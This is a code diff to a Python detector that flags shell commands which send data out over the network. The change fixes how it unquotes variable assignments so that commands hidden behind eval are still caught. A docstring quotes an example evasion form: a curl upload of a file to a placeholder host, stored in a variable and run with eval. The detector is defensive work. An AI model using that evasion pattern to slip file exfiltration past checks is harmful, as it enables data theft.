@@ -1375,6 +1375,25 @@ def _redact_network_evidence(action_text: str) -> str:
     return redacted
 
 
+def _network_assignment(word: str) -> tuple[str, str] | None:
+    """``(name, value)`` when a word of ``_network_shell_tokens`` assigns a variable, the value unquoted as a shell does.
+
+    The tokens keep their quotes, so ``A='curl -d @f https://x'`` would otherwise
+    assign ``'curl -d @f https://x'``, and ``eval "$A"`` would read an unterminated
+    quote instead of the curl command. A value whose quotes do not balance is kept
+    as written. A word quoted whole (``"A=x"``) still reads as an assignment.
+    """
+    assignment = _SHELL_ASSIGNMENT_RE.match(word) or _SHELL_ASSIGNMENT_RE.match(word.strip("\"'"))
+    if assignment is None:
+        return None
+    name, value = assignment.groups()
+    try:
+        words = shlex.split(value)
+    except ValueError:
+        return name, value
+    return name, words[0] if len(words) == 1 else value
+
+
 def _is_network_exfiltration_command(cmd_text: str, _depth: int = 0) -> bool:
     """Inspect a shell command for network client exfiltration indicators."""
     if not cmd_text or _depth > 3:
@@ -1413,11 +1432,11 @@ def _is_network_exfiltration_command(cmd_text: str, _depth: int = 0) -> bool:
 
         cmd_idx = 0
         while cmd_idx < len(command):
-            clean_tok = command[cmd_idx].strip("\"'")
-            assignment = _SHELL_ASSIGNMENT_RE.match(clean_tok)
-            if not assignment:
+            assignment = _network_assignment(command[cmd_idx])
+            if assignment is None:
                 break
-            assignments[assignment.group(1)] = assignment.group(2)
+            name, value = assignment
+            assignments[name] = value
             cmd_idx += 1
 
         unwrapped_idx = _unwrap_shell_command(command, cmd_idx, assignments)
